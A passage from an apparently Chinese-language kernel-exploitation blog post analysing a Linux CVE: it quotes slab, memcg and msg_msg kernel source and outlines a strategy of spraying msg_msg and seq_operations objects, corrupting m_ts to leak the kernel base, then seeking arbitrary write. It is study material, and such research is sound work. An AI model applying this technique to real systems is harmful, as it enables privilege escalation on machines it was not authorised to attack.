class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line"><span class="comment">/* For propagation, maximum size of a stored attr */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在之前的<code>kmem_cache</code>结构体的定义如上，可以看到的是内部会根据是否开启了<code>MEMCG</code>这个选项来添加<code>struct memcg_cache_params memcg_params;</code>这样一个额外的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">root_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> __<span class="title">rcu</span> *<span class="title">memcg_caches</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> __<span class="title">root_caches_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span></span><br><span class="line"><span class="keyword">bool</span> dying;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">kmem_caches_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span> <span class="title">refcnt</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*work_fn)(struct kmem_cache *);</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到的是首先会存放一个根slab的指针，在<code>memcg_caches</code>这里存放若干个子<code>memcg slab</code>管理结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">entries</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是说其可以通过根slab和子slab互相寻找。在上面这里结构体的定义中<code>entries</code>就是用于存放<code>memcg slab</code>的数组。所以可以理解为每一个根slab管理结构(根slab管理结构根据大小分类)都有一个对应的子memcg slab列表。</p><p>上面多为理论中的内容，下面讨论一下在实际面对时所遇到的问题：</p><p>在这个CVE中，所使用的所有分配对象的函数都为<code>kmalloc</code>那么这里先从这里看起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面在分为了两条分支，根据的是size是否为定量，那么根据这个cve正好会分别进入上面的两条分支中。在分配<code>msg_msg</code>时会进入到下面的<code>__kmalloc</code>函数中，在分配<code>ctx-&gt;legacy_data</code>时则会进入到上面的分支中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure><p>这里主要关注下面的<code>__kmalloc</code>函数，可以看到其中会先进入到<code>kmalloc_slab</code>获取对应的<code>slab</code>，其实根据动态调试的结果看到的是这里的slab与分配<code>ctx-&gt;legacy_data</code>时进入<code>kmem_cache_alloc_trace</code>函数的第一个参数是一致的所以我当时就很迷惑，随即请教了a3又看了一下<code>linux kernel 5.9</code>的commit才知道会在<code>slab_alloc</code>函数中出现问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line"> unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line">object = c-&gt;freelist;</span><br><span class="line">page = c-&gt;page;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">stat(s, ALLOC_SLOWPATH);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">object, tid,</span><br><span class="line">next_object, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">prefetch_freepointer(s, next_object);</span><br><span class="line">stat(s, ALLOC_FASTPATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">maybe_wipe_obj_freeptr(s, object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(slab_want_init_on_alloc(gfpflags, s)) &amp;&amp; object)</span><br><span class="line"><span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数其实就是对<code>slab_alloc_node</code>函数的套娃操作，然而<code>slab_alloc_node</code>函数内部首先会调用<code>slab_pre_alloc_hook</code>函数，起先并未注意到其返回值也是s所以并未当回事，那么现在详细分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache *<span class="title">slab_pre_alloc_hook</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">flags &amp;= gfp_allowed_mask;</span><br><span class="line"></span><br><span class="line">fs_reclaim_acquire(flags);</span><br><span class="line">fs_reclaim_release(flags);</span><br><span class="line"></span><br><span class="line">might_sleep_if(gfpflags_allow_blocking(flags));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_failslab(s, flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp;</span><br><span class="line">    ((flags &amp; __GFP_ACCOUNT) || (s-&gt;flags &amp; SLAB_ACCOUNT)))</span><br><span class="line"><span class="keyword">return</span> memcg_kmem_get_cache(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后会判断是否开启了<code>memcg</code>选项，并检测调用时的flags，所以也就是在这个位置导致slab改变了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">memcg_kmem_get_cache</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">memcg_cachep</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> *<span class="title">arr</span>;</span></span><br><span class="line"><span class="keyword">int</span> kmemcg_id;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!is_root_cache(cachep));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_bypass())</span><br><span class="line"><span class="keyword">return</span> cachep;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(current-&gt;active_memcg))</span><br><span class="line">memcg = current-&gt;active_memcg;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">memcg = mem_cgroup_from_task(current);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!memcg || memcg == root_mem_cgroup)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">kmemcg_id = READ_ONCE(memcg-&gt;kmemcg_id);</span><br><span class="line"><span class="keyword">if</span> (kmemcg_id &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">arr = rcu_dereference(cachep-&gt;memcg_params.memcg_caches);</span><br><span class="line"></span><br><span class="line">memcg_cachep = READ_ONCE(arr-&gt;entries[kmemcg_id]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!memcg_cachep))</span><br><span class="line">memcg_schedule_kmem_cache_create(memcg, cachep);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (percpu_ref_tryget(&amp;memcg_cachep-&gt;memcg_params.refcnt))</span><br><span class="line">cachep = memcg_cachep;</span><br><span class="line">out_unlock:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> cachep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数内部查看会发现其就是对额外的结构体做的一系列操作</p><h3 id="msg-msg"><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h3><p>至此可以开始认真分析关于此利用方法了，首先考虑的是如何实现泄漏内核地址。我们知道<code>msg_msg</code>结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>next</code>指针指向的是<code>msg_msgseg</code>结构体，而这个结构体在前面的文章中提到过，当我们发送的消息大小大于<code>0xfd0</code>时将超出范围的内容补充到<code>msg_msgseg</code>结构体，总体结构就是一个单向链表的结构。这里选择的办法肯定不能是内存搜索，这样存在的问题太多了，很容易造成<code>kernel panic</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line">msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">pseg = &amp;msg-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line">seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line">*pseg = seg;</span><br><span class="line">seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">pseg = &amp;seg-&gt;next;</span><br><span class="line">len -= alen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">free_msg(msg);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注<code>msg_msgseg</code>结构体的分配过程可以知道的是在Linux kernel 5.4版本依旧是通过普通的slab申请的，所以这里的选择是尽可能小的生成<code>msg_msgseg</code>结构体，随后使用<code>seq_operations</code>结构体来泄漏出内核基地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在以往的文章中介绍过这个结构体，这里简单提一下，这个结构体是内部全为函数指针的结构体，所以可以很轻松的泄漏。按照a3的做法，这里泄漏的办法是在每生成一个<code>msg_msgseg</code>时就分配一个<code>seq_operations</code>结构体，在最后完成<code>msg_msg</code>结构体的堆喷之后又大量堆喷<code>seq_operations</code>结构体，这样可以大大提高成功率使二者挨在一起再通过修改<code>m_ts</code>成员即可实现泄漏。</p><p>那么接下来需要考虑的是任意地址写的问题了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = -EFAULT;</span><br><span class="line"><span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">len -= 